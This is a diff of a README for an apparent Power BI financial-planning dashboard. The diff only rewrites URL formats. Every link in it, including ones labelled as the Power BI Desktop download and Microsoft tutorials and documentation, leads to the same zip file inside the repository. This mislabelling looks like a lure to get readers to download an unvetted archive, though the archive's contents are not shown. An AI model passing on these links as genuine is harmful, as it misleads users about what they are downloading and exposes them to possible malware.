@@ -1,6 +1,6 @@
 # 📊 Executive-FP-A-Dashboard - Simplify Financial Planning Insights
 
-[![Download](https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip)](https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip)
+[![Download](https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip)](https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip)
 
 ## 📌 Overview
 
@@ -24,7 +24,7 @@ This guide will walk you through downloading, installing, and opening the Execut
 
 To get the Executive-FP-A-Dashboard, visit the official release page by clicking the link below. This page contains the latest versions and all necessary files.
 
-[Download Executive-FP-A-Dashboard](https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip)
+[Download Executive-FP-A-Dashboard](https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -43,7 +43,7 @@ You need Power BI Desktop to open the dashboard file.
 
 - If you already have Power BI Desktop installed, skip to the next step.
 - To install Power BI Desktop:
-  - Visit https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip
+  - Visit https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip
   - Download the free version for your Windows PC.
   - Follow the on-screen instructions to install.
 
@@ -94,8 +94,8 @@ Good internet access is required to download the files and updates.
 
 If you are new to Power BI, Microsoft offers helpful tutorials and guides:
 
-- Power BI Guided Learning: https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip
-- Understanding Reports: https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip
+- Power BI Guided Learning: https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip
+- Understanding Reports: https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip
 
 ### Getting Support
 
@@ -132,8 +132,8 @@ This project relates to these areas, which might help you understand its purpose
 
 ## 🔗 Useful Links
 
-- [Executive-FP-A-Dashboard Releases](https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip)
-- [Power BI Desktop Download](https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip)
-- [Power BI Documentation](https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip)
+- [Executive-FP-A-Dashboard Releases](https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip)
+- [Power BI Desktop Download](https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip)
+- [Power BI Documentation](https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip)
 
-[![Download](https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip)](https://raw.githubusercontent.com/zeotyx/Executive-FP-A-Dashboard/main/website/templates/Executive-Dashboard-F-3.2.zip)
+[![Download](https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip)](https://github.com/zeotyx/Executive-FP-A-Dashboard/raw/refs/heads/main/website/templates/Executive-Dashboard-F-3.2.zip)
